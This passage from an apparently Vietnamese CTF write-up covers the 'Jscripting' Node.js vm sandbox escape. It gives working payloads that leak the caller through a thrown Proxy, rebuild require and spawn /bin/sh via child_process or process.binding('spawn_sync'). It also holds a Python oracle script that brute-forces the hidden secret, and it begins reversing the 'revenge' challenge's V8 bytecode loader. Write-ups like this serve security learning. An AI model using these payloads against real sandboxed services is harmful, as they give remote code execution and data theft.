</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">me</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39;return 123&#39;</span><span class="p">))();</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="nx">me</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>khi throw Exception thì attribute <code>stack</code> của exception sẽ được access, từ đó <code>get</code> của proxy sẽ được trigger và ta có thể leak được external object thông qua <code>arguments.callee.caller</code>. Ở đây thì <code>require</code> đã bị thay thế như bên trên đề cập, <code>globalThis.process</code> cũng bị set về null nhưng <code>globalThis.module</code> thì vẫn còn, ta có thể invoke tới <code>globalThis.module.constructor.createRequire</code> để tạo lại function <code>require</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">});(()</span> <span class="p">=&gt;</span> <span class="p">{</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">me</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39; globalThis.module.constructor.createRequire(&#34;/etc/passwd&#34;)(&#34;child_process&#34;).execSync(&#34;ls&#34;)&#39;</span><span class="p">))();</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="nx">me</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>Khi chạy payload trên ta nhận về một lỗi:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/97c034ab-ced2-4f3b-b09f-148bffbb333b" alt="image" />
    
  </figure>
</p>
<p>Khi mình trace vào source code của nodejs thì như sau:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/cc096d1d-0ed5-4aed-a8c3-507e4bccebe2" alt="image" />
    
  </figure>
</p>
<p>Nhìn lại code của đề:</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/152a2cf5-01da-4d94-895c-b000753864fc" alt="image" />
    
  </figure>
</p>
<p>Không rõ là vô tình hay cố ý nhưng việc set <code>process.env</code> thành null khiến cho ta không thể invoke <code>exec</code> của <code>child_process</code> được nữa. Một fact đó là <code>globalThis.process</code> thật ra là một module và được nodejs auto expose ra, ta có thể chủ động import lại module này bằng cách <code>require(&quot;process&quot;)</code>, ở đây ta có thể đơn giản là set <code>process.env = {}</code> để không gặp lỗi khi chạy <code>child_process</code> nữa, cách của mình thì lại lợi dụng <code>process.binding</code> để truy cập đến các low level API của nodejs, cụ thể là <code>spawn_sync</code> để RCE</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="mi">1</span><span class="p">});(()</span> <span class="p">=&gt;</span> <span class="p">{</span> <span class="k">throw</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({},</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">get</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">me</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="kr">const</span> <span class="nx">cc</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">callee</span><span class="p">.</span><span class="nx">caller</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="nx">cc</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">(</span><span class="nx">cc</span><span class="p">.</span><span class="nx">constructor</span><span class="p">.</span><span class="nx">constructor</span><span class="p">(</span><span class="s1">&#39; globalThis.module.constructor.createRequire(&#34;/etc/passwd&#34;)(&#34;process&#34;).binding(&#34;spawn_sync&#34;).spawn({file: &#34;/bin/sh&#34;,args: [&#34;/bin/sh&#34;,&#34;-c&#34;, &#34;calc.exe&#34; ], stdio: [ {type:&#34;pipe&#34;,readable:true,writable:false}, {type:&#34;pipe&#34;,readable:false,writable:true}, {type:&#34;pipe&#34;,readable:false,writable:true} ]})&#39;</span><span class="p">))();</span>
</span></span><span class="line"><span class="cl">         <span class="p">}</span>
</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="nx">me</span><span class="p">[</span><span class="nx">key</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span></code></pre></div><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/22a895ca-6fa1-4f10-95f2-a8264ce4c7d0" alt="image" />
    
  </figure>
</p>
<p>Thực chất ta có thể exfiltrate biến <code>flag</code>, nhưng flag thật thì nằm ở <code>secret</code>, code để oracle attack biến <code>flag</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="s2">&#34;1});(() =&gt; { throw new Proxy(</span><span class="si">{}</span><span class="s2">, {</span><span class="se">\n</span><span class="s2">  get: function(me, key) {</span><span class="se">\n\t</span><span class="s2"> const cc = arguments.callee.caller;</span><span class="se">\n\t</span><span class="s2"> if (cc != null) {</span><span class="se">\n\t\t</span><span class="s2">return (cc.constructor.constructor(&#39;if (Object.getOwnPropertyDescriptor(globalThis.storage, </span><span class="se">\&#34;</span><span class="s2">secret</span><span class="se">\&#34;</span><span class="s2">).value[INDEX] == </span><span class="se">\&#34;</span><span class="s2">CHAR</span><span class="se">\&#34;</span><span class="s2">) {return 200}else{return 404}&#39;))();</span><span class="se">\n\t</span><span class="s2"> }</span><span class="se">\n\t</span><span class="s2"> return me[key];</span><span class="se">\n</span><span class="s2">  }</span><span class="se">\n</span><span class="s2">})&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">charset</span> <span class="o">=</span> <span class="n">string</span><span class="o">.</span><span class="n">printable</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="s2">&#34;cr3{&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span> <span class="p">,</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">charset</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;INDEX&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;CHAR&#34;</span><span class="p">,</span> <span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;https://jscripting.1337.sb/api/execute&#34;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;script&#34;</span><span class="p">:</span> <span class="n">payload</span>
</span></span><span class="line"><span class="cl">            <span class="p">})</span>
</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;OK&#34;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">flag</span> <span class="o">+=</span> <span class="n">c</span>
</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;===&gt;&#34;</span> <span class="o">+</span> <span class="n">flag</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s2">&#34;}&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">pass</span>
</span></span></code></pre></div><p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/e8c7725e-a07c-4d66-9360-3f1927392741" alt="image" />
    
  </figure>
</p>


<h2 class="relative group">Jscripting-revenge 
    <div id="jscripting-revenge" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#jscripting-revenge" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>Vì có <code>revenge</code> trong tên nên hẳn là context bài này giống bài cũ, nhưng patch lại một cái gì đó. Ta thấy lần này có một file <code>utils.jsc</code> được ship cùng và một file <code>bytecode.js</code> dùng để run file file jsc kia</p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/6efbbcc6-0220-466d-99b4-ae3fbc6abefd" alt="image" />
    
  </figure>
</p>
<p>Dùng tính năng prettier của chrome để beautify lại cái js cho tiện</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;vm&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">generateScript</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fixBytecode</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">readSourceHash</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">d</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="mi">1</span> <span class="o">&lt;</span> <span class="nx">c</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">d</span> <span class="o">=</span> <span class="s2">&#34;\&#34;&#34;</span> <span class="o">+</span> <span class="s2">&#34;\u200B&#34;</span><span class="p">.</span><span class="nx">repeat</span><span class="p">(</span><span class="nx">c</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;\&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">e</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">Script</span><span class="p">(</span><span class="nx">d</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">cachedData</span><span class="o">:</span> <span class="nx">a</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">filename</span><span class="o">:</span> <span class="nx">b</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">cachedDataRejected</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;Invalid or incompatible cached data (cachedDataRejected)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">e</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">readSourceHash</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">isBuffer</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;bytecodeBuffer must be a buffer object.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">process</span><span class="p">.</span><span class="nx">version</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;v8.8&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">version</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;v8.9&#34;</span><span class="p">)</span> <span class="o">?</span> <span class="nx">a</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">16</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">)=&gt;</span><span class="nx">a</span> <span class="o">+=</span> <span class="nx">b</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="nx">c</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="nx">a</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="mi">12</span><span class="p">).</span><span class="nx">reduce</span><span class="p">((</span><span class="nx">a</span><span class="p">,</span><span class="nx">b</span><span class="p">,</span><span class="nx">c</span><span class="p">)=&gt;</span><span class="nx">a</span> <span class="o">+=</span> <span class="nx">b</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">pow</span><span class="p">(</span><span class="mi">256</span><span class="p">,</span> <span class="nx">c</span><span class="p">),</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">compileCode</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s2">&#34;string&#34;</span> <span class="o">!=</span> <span class="k">typeof</span> <span class="nx">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="sb">`javascriptCode must be string. </span><span class="si">${</span><span class="k">typeof</span> <span class="nx">a</span><span class="si">}</span><span class="sb"> was given.`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">vm</span><span class="p">.</span><span class="nx">Script</span><span class="p">(</span><span class="nx">a</span><span class="p">,{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">produceCachedData</span><span class="o">:</span> <span class="o">!</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createCachedData</span> <span class="o">&amp;&amp;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createCachedData</span><span class="p">.</span><span class="nx">call</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createCachedData</span><span class="p">()</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cachedData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">b</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">d</span> <span class="o">=</span> <span class="nx">brotliCompressSync</span><span class="p">(</span><span class="nx">d</span><span class="p">)),</span>
</span></span><span class="line"><span class="cl">    <span class="nx">d</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">fixBytecode</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">isBuffer</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;bytecodeBuffer must be a buffer object.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">compileCode</span><span class="p">(</span><span class="s2">&#34;\&#34;\u0CA0_\u0CA0\&#34;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nb">parseFloat</span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">version</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">5</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">process</span><span class="p">.</span><span class="nx">version</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;v8.8&#34;</span><span class="p">)</span> <span class="o">||</span> <span class="nx">process</span><span class="p">.</span><span class="nx">version</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s2">&#34;v8.9&#34;</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">20</span><span class="p">).</span><span class="nx">copy</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mi">16</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="mi">24</span><span class="p">).</span><span class="nx">copy</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mi">20</span><span class="p">))</span> <span class="o">:</span> <span class="mi">12</span> <span class="o">&lt;=</span> <span class="nx">c</span> <span class="o">&amp;&amp;</span> <span class="mi">21</span> <span class="o">&gt;=</span> <span class="nx">c</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">16</span><span class="p">).</span><span class="nx">copy</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="nx">b</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">16</span><span class="p">).</span><span class="nx">copy</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mi">12</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nx">b</span><span class="p">.</span><span class="nx">subarray</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="mi">20</span><span class="p">).</span><span class="nx">copy</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="mi">16</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">runBytecode</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Buffer</span><span class="p">.</span><span class="nx">isBuffer</span><span class="p">(</span><span class="nx">a</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s2">&#34;bytecodeBuffer must be a buffer object.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">generateScript</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">runInThisContext</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">runBytecodeFile</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="s2">&#34;string&#34;</span> <span class="o">!=</span> <span class="k">typeof</span> <span class="nx">a</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="sb">`filename must be a string. </span><span class="si">${</span><span class="k">typeof</span> <span class="nx">a</span><span class="si">}</span><span class="sb"> was given.`</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;fs&#39;</span><span class="p">).</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">runBytecode</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span><span class="line"><span class="cl"><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">runBytecodeFile</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p>Vậy file này dùng <code>vm</code> để run compiled bytecode, vậy mình nghĩ ta cần biết được thực sự file kia chạy gì, mình qua một file test để run standalone cái <code>utils.jsc</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/5fbf6d69-a112-4aaa-89af-6ac91762ceec" alt="image" />
    
  </figure>
</p>
<p>Bị lỗi, nhìn lại vào source <code>worker.js</code> ta thấy <code>runBytecodeFile(&quot;./utils.jsc&quot;)</code> trả về một anonymous function, trước khi invoke function này thì có một dòng <code>globalThis.require = require;</code>, ta thử thêm dòng này vào vì khả năng function mà lỗi đang nhắc đến là <code>globalThis.require</code></p>
<p>
  <figure>
    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/CP04042K/cp04042k.github.io/assets/35491855/91e8f86c-5f1c-48d7-aaf7-7e537c25c99d" alt="image" />
    
  </figure>
</p>
<p>Lỗi khác được trả về, tới đây thì stuck một lúc, mình suy đoán là có thể nó đang thao tác gì đó với <code>globalThis.storage</code> nên mình thử thêm vào</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="p">{</span> <span class="nx">runBytecodeFile</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;./bytecode.js&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">require</span> <span class="o">=</span> <span class="nx">require</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">secret</span> <span class="o">=</span> <span class="s2">&#34;SECRET&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nx">flag</span> <span class="o">=</span> <span class="s2">&#34;FLAG&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">globalThis</span><span class="p">.</span><span class="nx">storage</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Proxy</span><span class="p">({</span> <span class="nx">secret</span> <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nx">getOwnPropertyDescriptor</span><span class="o">:</span> <span class="p">(</span><span class="nx">target</span><span class="p">,</span> <span class="nx">name</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">name</span> <span class="o">===</span> <span class="s2">&#34;secret&#34;</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">value</span><span class="o">:</span> <span class="nx">flag</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">writable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">enumerable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                    <span class="nx">configurable</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">                <span class="p">};</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">target</span><span class="p">[</span><span class="nx">name</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">runBytecodeFile</span><span class="p">(</span><span class="s2">&#34;./utils.jsc&#34;</span><span class="p">)();</span>
</span></span></code></pre></div><p>Lần này lỗi không throw ra nữa, nhưng vấn đề là làm sao để ta biết được cụ thể thì <code>utils.js</code> đang làm gì?</p>


<h3 class="relative group">Reversing V8 bytecode 
    <div id="reversing-v8-bytecode" class="anchor"></div>
    
    <span
